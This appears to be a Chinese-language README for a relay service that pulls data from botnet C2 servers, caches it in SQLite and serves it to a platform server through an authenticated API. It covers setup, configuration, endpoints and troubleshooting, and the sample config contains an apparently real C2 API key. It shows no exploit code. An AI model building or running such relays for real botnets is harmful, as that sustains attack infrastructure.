# 中继节点服务器 (Relay Node Server)

僵尸网络数据中继服务 - 从C2端拉取数据，提供给平台服务器拉取

---

## 📋 项目概述

中继节点作为C2端和平台服务器之间的数据中转站，负责：
- 📥 从C2端（公网）定时拉取数据
- 💾 本地SQLite缓存（7天保留期）
- 📤 提供HTTP/HTTPS API供平台服务器拉取
- 🔄 两阶段提交和断点续传
- 🔐 API密钥认证

---

## 🏗️ 系统架构

### 当前架构（阶段1）

```
┌─────────────┐       ┌──────────────┐       ┌───────────────┐
│ C2服务器     │       │ 中继节点      │       │ 平台服务器     │
│ (公网)      │◄─────►│ (本服务)     │◄──────│ (拉取模式)    │
│             │ HTTP  │              │ HTTPS │               │
└─────────────┘       └──────────────┘       └───────────────┘
                            │
                            │
                      ┌─────┴─────┐
                      │  SQLite   │
                      │  7天缓存   │
                      └───────────┘
```

### 未来架构（阶段2 - 预留扩展）

```
┌──────────────────┐
│ 动态IP资源池      │
│ (多节点)         │
└────────┬─────────┘
         │ PUSH
         ▼
┌──────────────────┐
│   中继节点        │
│ (两种模式)       │◄──── PULL ───── 平台服务器
│ 1. 拉取C2        │
│ 2. 接收推送      │
└──────────────────┘
         ▲
         │ PULL
         │
    ┌────┴────┐
    │ C2端    │
    └─────────┘
```

---

## 📁 文件结构

```
relay_node/
├── relay_data_server.py      # 主服务器（HTTP API + 后台拉取）
├── data_puller.py             # C2数据拉取模块
├── data_storage.py            # SQLite存储模块
├── config_loader.py           # 配置加载器
├── relay_node_config.json     # 配置文件
├── .env.example              # 环境变量示例
├── requirements.txt           # Python依赖
├── start_relay_node.sh        # 启动脚本
├── README.md                  # 本文件
└── HTTPS_UPGRADE_GUIDE.md     # HTTPS升级指南
```

---

## ✨ 核心特性

### 1. 数据拉取
- ✅ 多C2端点支持
- ✅ 两阶段提交确认
- ✅ 断点续传（seq_id）
- ✅ 失败自动重试
- ✅ 健康检查

### 2. 数据提供
- ✅ HTTP API（GET /api/pull）
- ✅ 两阶段提交（POST /api/confirm）
- ✅ API密钥认证
- ✅ 批量拉取
- ✅ 断点续传支持

### 3. 数据管理
- ✅ SQLite本地缓存
- ✅ 7天自动清理
- ✅ 状态追踪（pending/served）
- ✅ 统计信息

### 4. 扩展性
- ✅ 预留推送接收接口（POST /api/data-push）
- ✅ 支持HTTPS（可选）
- ✅ 环境变量配置

---

## 🚀 快速开始

### 步骤1: 安装依赖

```bash
# Python依赖
pip3 install -r requirements.txt

# 或者手动安装
pip3 install aiohttp aiofiles requests
```

### 步骤2: 配置服务

#### 方法A: 修改配置文件（推荐）

```bash
# 编辑配置文件
vim relay_node_config.json
```

**关键配置**：
```json
{
  "puller": {
    "c2_servers": [
      {
        "id": "c2-1",
        "url": "http://C2公网IP:8888",
        "api_key": "KiypG4zWLXqnREqGPH8L2Oh9ybvi6Yh4"
      }
    ]
  },
  "server": {
    "host": "0.0.0.0",
    "port": 8888,
    "api_key": "your_relay_node_api_key",
    "use_https": false
  }
}
```

#### 方法B: 使用环境变量

```bash
# 复制环境变量示例
cp .env.example .env

# 编辑环境变量
vim .env

# 设置环境变量
export C2_URL="http://C2_IP:8888"
export C2_API_KEY="xxx"
export RELAY_API_KEY="xxx"
```

### 步骤3: 运行服务

```bash
# 方式1: 使用启动脚本
chmod +x start_relay_node.sh
./start_relay_node.sh

# 方式2: 直接运行
python3 relay_data_server.py

# 方式3: 后台运行
nohup python3 relay_data_server.py > relay_node.log 2>&1 &
```

### 步骤4: 验证运行

```bash
# 健康检查
curl -H "X-API-Key: your_relay_node_api_key" http://localhost:8888/health

# 查看统计
curl -H "X-API-Key: your_relay_node_api_key" http://localhost:8888/api/stats

# 测试拉取数据
curl -H "X-API-Key: your_relay_node_api_key" \
     "http://localhost:8888/api/pull?limit=10"
```

---

## 🔌 API接口

### 1. 健康检查

```bash
GET /health
Headers:
  X-API-Key: your_relay_node_api_key

Response:
{
  "status": "healthy",
  "timestamp": "2026-05-18T14:00:00",
  "storage": {
    "total_records": 1000,
    "pending": 500,
    "served": 500
  },
  "c2_servers": {
    "c2-1": true
  }
}
```

### 2. 统计信息

```bash
GET /api/stats
Headers:
  X-API-Key: your_relay_node_api_key

Response:
{
  "storage": {...},
  "service": {
    "total_pulled": 5000,
    "total_served": 3000,
    "last_pull_time": "2026-05-18T14:00:00"
  }
}
```

### 3. 拉取数据（供平台使用）

```bash
GET /api/pull?limit=1000&confirm=false&since_seq=100
Headers:
  X-API-Key: your_relay_node_api_key

Query参数:
  - limit: 最大返回数量（默认1000，最大5000）
  - confirm: 是否立即确认（默认false，两阶段提交）
  - since_seq: 断点续传起始序列号（可选）

Response:
{
  "success": true,
  "count": 500,
  "data": [...],
  "max_seq_id": 600,
  "timestamp": "2026-05-18T14:00:00"
}
```

### 4. 确认数据（两阶段提交）

```bash
POST /api/confirm
Headers:
  X-API-Key: your_relay_node_api_key
  Content-Type: application/json

Body:
{
  "count": 500
}

Response:
{
  "success": true,
  "confirmed": 500,
  "timestamp": "2026-05-18T14:00:00"
}
```

---

## ⚙️ 配置说明

### 配置文件参数

| 参数 | 说明 | 默认值 |
|------|------|--------|
| `storage.db_file` | 数据库文件路径 | ./relay_node_cache.db |
| `storage.retention_days` | 数据保留天数 | 7 |
| `puller.batch_size` | 拉取批量大小 | 1000 |
| `puller.timeout` | 拉取超时（秒） | 30 |
| `server.host` | 监听地址 | 0.0.0.0 |
| `server.port` | 监听端口 | 8888 |
| `server.use_https` | 启用HTTPS | false |
| `intervals.pull` | 拉取间隔（秒） | 10 |
| `intervals.cleanup` | 清理间隔（秒） | 3600 |

### 环境变量（优先级高于配置文件）

| 环境变量 | 说明 |
|---------|------|
| `C2_URL` | C2服务器URL |
| `C2_API_KEY` | C2 API密钥 |
| `RELAY_API_KEY` | 中继节点API密钥 |
| `SERVER_HOST` | 监听地址 |
| `SERVER_PORT` | 监听端口 |
| `USE_HTTPS` | 启用HTTPS (true/false) |
| `PULL_INTERVAL` | 拉取间隔（秒） |

---

## 🔐 配置平台服务器

修改平台的配置文件，将C2端点改为中继节点：

```python
# backend/config.py

C2_ENDPOINTS = [
    {
        'id': 'relay-node-1',
        'url': 'http://中继节点IP:8888',  # 改成中继节点地址
        'api_key': 'your_relay_node_api_key',  # 中继节点的API密钥
        'botnet_type': 'utg_q_008',
        'enabled': True,
        'description': '中继节点1'
    }
]
```

**注意**：
- 平台的 `remote_puller.py` 无需修改，自动兼容
- 仅需修改配置文件中的URL和API密钥
- 如果中继节点启用HTTPS，URL改为 `https://...`

---

## 🔒 启用HTTPS

详见 [HTTPS_UPGRADE_GUIDE.md](HTTPS_UPGRADE_GUIDE.md)

**快速步骤**：

1. 生成自签名证书（测试用）：
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```

2. 修改配置：
```json
{
  "server": {
    "use_https": true,
    "ssl_cert": "./cert.pem",
    "ssl_key": "./key.pem"
  }
}
```

3. 重启服务

---

## 📊 监控管理

### 查看日志

```bash
# 实时日志
tail -f relay_node.log

# 查看错误
grep "ERROR" relay_node.log

# 查看统计
grep "统计" relay_node.log
```

### 数据库查询

```bash
# 查看数据统计
sqlite3 relay_node_cache.db "
SELECT status, COUNT(*) as count 
FROM data_records 
GROUP BY status;
"

# 查看最新数据
sqlite3 relay_node_cache.db "
SELECT * FROM data_records 
ORDER BY created_at DESC 
LIMIT 10;
"

# 查看序列号范围
sqlite3 relay_node_cache.db "
SELECT MIN(seq_id), MAX(seq_id) 
FROM data_records 
WHERE status = 'pending';
"
```

---

## 🔧 常见问题

### Q1: C2服务器连接失败？

```bash
# 检查网络连通性
ping C2_IP
curl http://C2_IP:8888/health

# 检查防火墙
sudo ufw status
```

### Q2: 平台拉取数据失败？

```bash
# 检查中继节点状态
curl -H "X-API-Key: xxx" http://中继节点IP:8888/health

# 检查API密钥
# 确保平台配置的api_key与中继节点一致
```

### Q3: 数据积压（pending过多）？

```bash
# 查看统计
curl -H "X-API-Key: xxx" http://localhost:8888/api/stats

# 检查平台是否在拉取
tail -f relay_node.log | grep "平台拉取"
```

---

## 📈 性能建议

### 根据数据量调整间隔

| 数据量 | pull间隔 |
|--------|----------|
| < 1000条/小时 | 30秒 |
| 1000-10000条/小时 | 10秒 |
| > 10000条/小时 | 5秒 |

### 批量大小建议

```json
{
  "puller": {"batch_size": 5000},  // 大数据量
  "server": {"max_batch": 5000}
}
```

---

## 🚀 未来扩展

### 支持动态IP资源池推送

1. 启用推送模式：
```json
{
  "push_mode": {
    "enabled": true
  }
}
```

2. 动态IP节点推送数据：
```bash
POST /api/data-push
{
  "data": [...],
  "source": "dynamic-pool-1"
}
```

### 支持多中继节点集群

未来可以部署多个中继节点实现负载均衡和高可用。

---

## 📝 更新日志

### v1.0.0 (2026-05-18)
- ✅ 初始版本发布
- ✅ 支持从C2拉取数据
- ✅ 提供API供平台拉取
- ✅ 两阶段提交
- ✅ 断点续传
- ✅ HTTPS支持（可选）
- ✅ 预留推送接收接口

---

## 📞 技术支持

遇到问题？请提供：
1. 配置文件：`relay_node_config.json`
2. 日志文件：`relay_node.log`（最近100行）
3. 健康检查输出：`curl http://localhost:8888/health`

---

**🎉 现在就开始部署吧！**
